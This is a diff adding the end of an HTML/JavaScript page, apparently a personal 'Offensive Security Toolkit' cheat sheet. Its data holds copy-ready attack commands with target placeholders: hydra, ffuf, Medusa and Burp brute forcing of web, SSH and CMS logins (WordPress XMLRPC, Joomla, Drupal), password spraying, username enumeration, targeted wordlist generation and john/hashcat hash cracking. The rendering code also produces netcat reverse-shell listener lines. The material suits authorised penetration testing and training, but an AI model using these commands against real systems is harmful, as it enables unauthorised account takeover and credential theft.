+      {l:"Determine filter",t:"# Run with -mc all first to see all responses:\nffuf -u http://{{target}}/login.php -X POST -d 'username={{user}}&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/wordlists/rockyou.txt -mc all -v | head -30\n\n# Then filter by size/code:\n# -fs 4242  (filter by response size)\n# -fc 401   (filter by status code)\n# -fr 'Invalid' (filter by regex in response)"},
+      {l:"With cookie",t:"ffuf -u http://{{target}}/login.php -X POST -d 'username={{user}}&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=abc123' -w /usr/share/wordlists/rockyou.txt -fc 200"},
+    ],note:"ffuf is faster than hydra for web forms. Use -mc all first to see response patterns, then add filters."},
+    {name:"BurpSuite Intruder Guide",tags:["burp","http"],cmds:[
+      {l:"Setup steps",t:"# 1. Capture login request in Proxy > HTTP History\n# 2. Right-click > Send to Intruder\n# 3. Intruder > Positions tab:\n#    - Click 'Clear' to remove auto-markers\n#    - Select the password value > click 'Add'\n#    - Attack type: Sniper (1 payload set)\n# 4. Intruder > Payloads tab:\n#    - Load wordlist file\n# 5. Intruder > Settings tab:\n#    - Grep Match: add the failure string (e.g., 'Invalid')\n#    - This adds a column showing which responses contain it\n# 6. Start attack > sort by the grep column or status code/length"},
+      {l:"CSRF token handling",t:"# If login has CSRF token:\n# 1. Intruder > Settings > Grep Extract:\n#    - Add > select the token value in the response\n#    - This creates a recursive grep extraction\n# 2. Intruder > Settings > Redirections: Always\n# 3. Resource Pool: 1 thread (CSRF tokens are sequential)\n# 4. Pitchfork attack type if bruting both user and pass"},
+    ],note:"Burp Intruder handles CSRF tokens via Recursive Grep. Community Edition is rate-limited; use Pro for speed."},
+  ]},
+  {section:"CMS Login Brute Force",items:[
+    {name:"WordPress (wp-login.php)",tags:["wordpress","http"],cmds:[
+      {l:"WPScan (best tool)",t:"# Enumerate users first:\nwpscan --url http://{{target}} --enumerate u\n\n# Brute force:\nwpscan --url http://{{target}} --usernames {{user}} --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login"},
+      {l:"XMLRPC brute (faster)",t:"# wp.getUsersBlogs allows 500+ passwords per request:\nwpscan --url http://{{target}} --usernames {{user}} --passwords /usr/share/wordlists/rockyou.txt --password-attack xmlrpc\n\n# Check if xmlrpc.php is enabled:\ncurl -s -d '\x3cmethodCall>\x3cmethodName>system.listMethods\x3c/methodName>\x3c/methodCall>' http://{{target}}/xmlrpc.php"},
+      {l:"Hydra fallback",t:"# If wpscan fails, use hydra:\nhydra -l {{user}} -P /usr/share/wordlists/rockyou.txt {{target}} http-post-form \"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect\" -V"},
+    ],note:"Always use wpscan for WordPress. XMLRPC method is fastest as it batches password attempts. Enumerate users first with ?author=1,2,3..."},
+    {name:"Joomla",tags:["joomla","http"],cmds:[
+      {l:"Find login + token",t:"# Joomla admin login:\nhttp://{{target}}/administrator/\n\n# Extract CSRF token from login page:\nTOKEN=$(curl -s -c cookies.txt http://{{target}}/administrator/ | grep -oP 'name=\"[a-f0-9]{32}\"' | head -1 | grep -oP '[a-f0-9]{32}')\necho \"CSRF Token: $TOKEN\""},
+      {l:"Hydra with token",t:"# Joomla login POST body includes a 32-char CSRF token:\n# You must extract it first (see above), then:\nhydra -l {{user}} -P /usr/share/wordlists/rockyou.txt {{target}} http-post-form \"/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login&$TOKEN=1:F=mod-login\" -V\n\n# Note: token changes per session. Hydra may fail. Use Burp Intruder with Recursive Grep instead."},
+    ],note:"Joomla uses a 32-char CSRF token that changes per session. Burp Intruder with Recursive Grep is most reliable for Joomla brute force."},
+    {name:"Drupal",tags:["drupal","http"],cmds:[
+      {l:"Find login + form_build_id",t:"# Drupal login path:\nhttp://{{target}}/user/login\n\n# Extract form_build_id:\nFORM_ID=$(curl -s http://{{target}}/user/login | grep -oP 'form_build_id\" value=\"[^\"]+' | head -1 | cut -d'\"' -f3)\necho \"form_build_id: $FORM_ID\""},
+      {l:"Hydra",t:"hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt {{target}} http-post-form \"/user/login:name=^USER^&pass=^PASS^&form_id=user_login_form&op=Log+in:F=Unrecognized\" -V"},
+    ],note:"Drupal has form_build_id CSRF token. Default admin path is /user/login. Check for user enumeration at /user/1, /user/2..."},
+  ]},
+  {section:"Password Spraying",items:[
+    {name:"Password Spray Strategy",tags:["spray"],cmds:[
+      {l:"Build user list",t:"# 1. Gather usernames from:\n# Web app user enumeration (different error for valid vs invalid user)\n# OSINT: LinkedIn, Hunter.io, email harvesting\n# Common patterns: first.last, flast, firstl\n\n# 2. Verify naming convention:\ncurl -s -d 'username=admin&password=wrong' http://{{target}}/login | grep -i 'invalid\\|incorrect\\|not found'\ncurl -s -d 'username=nonexistent999&password=wrong' http://{{target}}/login | grep -i 'invalid\\|incorrect\\|not found'\n# Different responses = user enumeration possible"},
+      {l:"Spray approach",t:"# RULE: 1 password across ALL users, wait, next password\n# Avoids lockout (which triggers on per-user failures)\n\n# Top spray passwords:\n# Season+Year: Spring2024, Summer2024\n# Company+123: CompanyName123!\n# Month+Year: January2024!\n# Welcome1, Password1, Changeme1\n\n# Spray with hydra (swap -l/-p to iterate users per password):\nhydra -L users.txt -p 'Spring2024!' {{target}} http-post-form \"/login:user=^USER^&pass=^PASS^:F=invalid\" -V"},
+      {l:"CrackMapExec spray",t:"# SMB spray (best for AD environments):\ncrackmapexec smb {{target}} -u users.txt -p 'Spring2024!' --continue-on-success\n\n# WinRM spray:\ncrackmapexec winrm {{target}} -u users.txt -p 'Spring2024!'"},
+    ],note:"Spray = 1 password, many users. Avoids per-user lockout. Wait 30+ minutes between password attempts. Always check lockout policy first."},
+  ]},
+  {section:"Wordlist Preparation",items:[
+    {name:"Custom Wordlist Generation",tags:["wordlist"],cmds:[
+      {l:"CeWL (scrape target site)",t:"# Generate wordlist from target website:\ncewl http://{{target}} -d 3 -m 5 -w cewl_words.txt\n\n# -d 3: crawl depth 3\n# -m 5: min word length 5\n# With email harvesting:\ncewl http://{{target}} -d 3 -m 5 -e --email_file emails.txt -w cewl_words.txt"},
+      {l:"Add common mutations",t:"# Use John rules to mutate CeWL output:\njohn --wordlist=cewl_words.txt --rules=best64 --stdout > mutated.txt\n\n# Or manual mutations:\nfor word in $(cat cewl_words.txt); do\n  echo \"$word\"; echo \"${word}123\"; echo \"${word}!\"\n  echo \"${word}2024\"; echo \"${word}2025\"\n  echo \"$(echo $word | sed 's/./\\U&/')\" # capitalize first\ndone > custom_list.txt"},
+      {l:"Cupp (profile-based)",t:"# Generate passwords based on target person info:\ncupp -i\n# Enter: first name, last name, birthday, partner name, pet, etc.\n# Generates targeted password list"},
+    ],note:"Always generate a custom wordlist from the target site (CeWL) before using rockyou.txt. Targeted wordlists are smaller and more effective."},
+    {name:"Wordlist Paths (Kali)",tags:["wordlist"],cmds:[
+      {l:"Common locations",t:"# General:\n/usr/share/wordlists/rockyou.txt\n/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt\n/usr/share/seclists/Passwords/Common-Credentials/best1050.txt\n/usr/share/seclists/Passwords/Leaked-Databases/\n\n# Usernames:\n/usr/share/seclists/Usernames/Names/names.txt\n/usr/share/seclists/Usernames/top-usernames-shortlist.txt\n\n# Default creds:\n/usr/share/seclists/Passwords/Default-Credentials/"},
+      {l:"Unzip rockyou if needed",t:"# rockyou.txt comes compressed on fresh Kali:\nls -la /usr/share/wordlists/rockyou.txt.gz 2>/dev/null && sudo gunzip /usr/share/wordlists/rockyou.txt.gz\nwc -l /usr/share/wordlists/rockyou.txt"},
+    ],note:"SecLists is the gold standard. Install: apt install seclists. rockyou.txt has 14M passwords."},
+    {name:"Username Enumeration First",tags:["enum"],cmds:[
+      {l:"Web app user enum",t:"# Test if app reveals valid usernames:\n# Try login with known-bad password:\ncurl -s -d 'user=admin&pass=wrong' http://{{target}}/login\n# vs\ncurl -s -d 'user=doesnotexist123&pass=wrong' http://{{target}}/login\n\n# If responses differ -> enumerate:\nffuf -u http://{{target}}/login -X POST -d 'user=FUZZ&pass=wrong' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -mr 'Invalid password' -v"},
+      {l:"Timing-based enum",t:"# Valid users may take longer (DB lookup + hash compare):\nfor u in admin root user test; do\n  TIME=$(curl -s -o /dev/null -w '%{time_total}' -d \"user=$u&pass=wrong\" http://{{target}}/login)\n  echo \"$u: ${TIME}s\"\ndone\n# Significantly longer time = valid username"},
+      {l:"Registration / forgot password",t:"# Test registration page:\ncurl -s -d 'username=admin' http://{{target}}/register | grep -i 'already\\|taken\\|exists'\n\n# Test forgot password:\ncurl -s -d 'email=admin@{{target}}' http://{{target}}/forgot | grep -i 'sent\\|not found'"},
+    ],note:"ALWAYS enumerate valid usernames before brute forcing passwords. Reduces keyspace dramatically. Check login, register, and forgot-password pages."},
+  ]},
+  {section:"Hash Cracking (Offline Brute)",items:[
+    {name:"John the Ripper",tags:["john","offline"],cmds:[
+      {l:"Auto-detect + crack",t:"john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\n\n# Show cracked:\njohn --show hashes.txt"},
+      {l:"Specific format",t:"# If auto-detect fails, specify format:\njohn --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\njohn --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\njohn --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\njohn --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\n\n# List all formats:\njohn --list=formats | tr ',' '\\n' | grep -i 'FORMAT_NAME'"},
+      {l:"Rules (mutations)",t:"john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hashes.txt\njohn --wordlist=cewl_words.txt --rules=all hashes.txt"},
+      {l:"Identify hash type",t:"# Use hash-identifier or hashid:\nhashid 'HASH_VALUE_HERE'\nhash-identifier\n\n# Common patterns:\n# 32 chars = MD5\n# 40 chars = SHA1\n# 64 chars = SHA256\n# $1$ = MD5crypt\n# $2a$ or $2b$ = bcrypt\n# $6$ = SHA512crypt\n# starts with 'aad3b' (NTLM often starts with this pattern, 32 hex chars)"},
+    ],note:"john auto-detects most formats. Use --show to see results. Cracked passwords are stored in ~/.john/john.pot"},
+    {name:"Hashcat",tags:["hashcat","offline"],cmds:[
+      {l:"Common modes",t:"# -m = hash mode. Common ones:\nhashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt     # MD5\nhashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt   # SHA1\nhashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt  # SHA256\nhashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt  # NTLM\nhashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt  # bcrypt\nhashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt  # sha512crypt\nhashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt   # md5crypt"},
+      {l:"With rules",t:"hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n\n# Show cracked:\nhashcat -m 0 hashes.txt --show"},
+      {l:"Hashcat in WSL/no GPU",t:"# Force CPU mode (no GPU in VM/WSL):\nhashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --force\n\n# Or use John instead (CPU-native):\njohn --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt"},
+    ],note:"hashcat is GPU-accelerated = much faster than John for large wordlists. Use --force for CPU-only (VMs). Use hashcat --help | grep -i 'format' to find -m mode."},
+  ]},
+  {section:"Service-Specific Tools",items:[
+    {name:"Medusa (Multi-Service)",tags:["medusa"],cmds:[
+      {l:"Basic syntax",t:"medusa -h {{target}} -u {{user}} -P /usr/share/wordlists/rockyou.txt -M ssh\nmedusa -h {{target}} -u {{user}} -P /usr/share/wordlists/rockyou.txt -M ftp\nmedusa -h {{target}} -u {{user}} -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin"},
+      {l:"Available modules",t:"medusa -d\n\n# Common modules: ssh, ftp, http, mssql, mysql, postgres,\n# rdp, smb, snmp, telnet, vnc, pop3, imap, smtp-auth"},
+    ],note:"Medusa is an alternative to Hydra. Supports parallel host brute forcing with -H hosts.txt."},
+    {name:"Ncrack",tags:["ncrack"],cmds:[
+      {l:"Basic",t:"ncrack -v --user {{user}} -P /usr/share/wordlists/rockyou.txt {{target}}:22\nncrack -v --user {{user}} -P /usr/share/wordlists/rockyou.txt rdp://{{target}}"},
+      {l:"Multiple services",t:"ncrack -v --user {{user}} -P /usr/share/wordlists/rockyou.txt {{target}}:21,22,3389"},
+    ],note:"Ncrack supports SSH, RDP, FTP, Telnet, HTTP, SMB, VNC. Good RDP brute force support."},
+    {name:"Patator (Advanced)",tags:["patator"],cmds:[
+      {l:"SSH",t:"patator ssh_login host={{target}} user={{user}} password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Authentication failed.'"},
+      {l:"HTTP POST",t:"patator http_fuzz url=http://{{target}}/login method=POST body='user={{user}}&pass=FILE0' 0=/usr/share/wordlists/rockyou.txt -x ignore:fgrep='Invalid'"},
+    ],note:"Patator is highly flexible. -x ignore:condition filters out failures. Good for edge cases where Hydra fails."},
+  ]},
+],
+
+};
+
+// ── Render attack pages ──
+function renderAttackPage(page, searchQuery='') {
+  const data = ATTACKS[page];
+  if (!data) return;
+  const vars = gv();
+  const root = document.getElementById(page + '-root');
+  root.innerHTML = '';
+  let totalItems = 0;
+
+  data.forEach((sec, si) => {
+    const sdiv = document.createElement('div');
+    let visibleItems = 0;
+
+    const itemsHtml = sec.items.map((item, ii) => {
+      if (searchQuery) {
+        const q = searchQuery.toLowerCase();
+        const match = item.name.toLowerCase().includes(q) ||
+          item.tags.some(t => t.includes(q)) ||
+          item.cmds.some(c => c.t.toLowerCase().includes(q) || c.l.toLowerCase().includes(q)) ||
+          (item.note && item.note.toLowerCase().includes(q));
+        if (!match) return '';
+      }
+      visibleItems++;
+      totalItems++;
+      const id = `${page}_${si}_${ii}`;
+      const tagsH = item.tags.map(t => `<span class="tag ${TAGMETA[t] ? TAGMETA[t].c : 't-cmd'}">${TAGMETA[t] ? TAGMETA[t].l : t}</span>`).join('');
+      const cmdsH = item.cmds.map((c, ci) => {
+        const fid = `${id}c${ci}`;
+        return `<div class="crow"><span class="clabel">${esc(c.l)}</span><div class="cbox" id="${fid}">${esc(fill(c.t, vars))}</div><button class="cpbtn" onclick="cp('${fid}',this)">Copy</button></div>`;
+      }).join('');
+      return `<div class="mcard">
+        <div class="mhdr" onclick="toggleM('${id}')">
+          <span class="mname">${esc(item.name)}</span>
+          <div class="tags">${tagsH}</div>
+          <span class="tico" id="ico_${id}">+</span>
+        </div>
+        <div class="mbody" id="${id}">
+          ${cmdsH}
+          ${item.note ? `<div class="cnote">${esc(fill(item.note, vars))}</div>` : ''}
+        </div>
+      </div>`;
+    }).join('');
+
+    if (visibleItems > 0) {
+      sdiv.innerHTML = `<div class="sec-lbl">${esc(sec.section)}</div>${itemsHtml}`;
+      root.appendChild(sdiv);
+    }
+  });
+
+  const cntEl = document.getElementById('cnt-' + page);
+  if (cntEl) cntEl.textContent = totalItems;
+}
+
+function filterCards(page) {
+  const q = document.getElementById('search-' + page).value;
+  renderAttackPage(page, q);
+}
+
+// ── wire up topbar inputs ──
+document.querySelectorAll('.topbar input').forEach(el => {
+  el.addEventListener('input', () => {
+    if (document.getElementById('page-methods').classList.contains('active')) renderMethods();
+    const port = document.getElementById('v_sport').value || '4444';
+    const nc = document.getElementById('lst-nc');
+    const rl = document.getElementById('lst-rl');
+    if (nc) nc.textContent = `nc -lvnp ${port}`;
+    if (rl) rl.textContent = `rlwrap nc -lvnp ${port}`;
+    ATTACK_PAGES.forEach(p => {
+      if (document.getElementById('page-' + p).classList.contains('active')) renderAttackPage(p);
+    });
+  });
+});
+
+// sync rs inputs from global vars on focus
+document.getElementById('rs_ip').addEventListener('focus', function () { if (!this.value) this.value = document.getElementById('v_ip').value; });
+document.getElementById('rs_port').addEventListener('focus', function () { if (!this.value) this.value = document.getElementById('v_sport').value; });
+
+// ── init ──
+(function init() {
+  document.getElementById('rs_ip').value = document.getElementById('v_ip').value;
+  document.getElementById('rs_port').value = document.getElementById('v_sport').value;
+  // Set sidebar counts
+  ATTACK_PAGES.forEach(p => {
+    if (ATTACKS[p]) {
+      let count = 0;
+      ATTACKS[p].forEach(sec => count += sec.items.length);
+      const el = document.getElementById('cnt-' + p);
+      if (el) el.textContent = count;
+    }
+  });
+})();
+</script>
+<button id="theme-toggle-btn" title="Toggle theme (t)">☀</button>
+
+<script>
+(function(){
+  function setTheme(theme) {
+    document.documentElement.setAttribute('data-theme', theme);
+    var btn = document.getElementById('theme-toggle-btn');
+    if (btn) btn.textContent = theme === 'dark' ? '☀' : '🌙';
+    try { localStorage.setItem('mahdiesta-theme', theme); } catch(e) {}
+  }
+  function toggleTheme() {
+    var current = document.documentElement.getAttribute('data-theme') || 'dark';
+    setTheme(current === 'dark' ? 'light' : 'dark');
+  }
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 't' || e.key === 'T') toggleTheme();
+  });
+  var btn = document.getElementById('theme-toggle-btn');
+  if (btn) btn.addEventListener('click', toggleTheme);
+  var saved = 'dark';
+  try { saved = localStorage.getItem('mahdiesta-theme') || 'dark'; } catch(e) {}
+  setTheme(saved);
+})();
+</script>
+
+<footer style="text-align:center;padding:1.5rem;border-top:1px solid var(--mah-border);color:var(--mah-text-secondary);font-size:0.75rem;font-family:'JetBrains Mono',monospace;margin-top:2rem;">
+  Built with <span style="color:#f87171;">&hearts;</span> by Mahdiesta — Offensive Security Toolkit
+</footer>
+
+</body>
+</html>
+
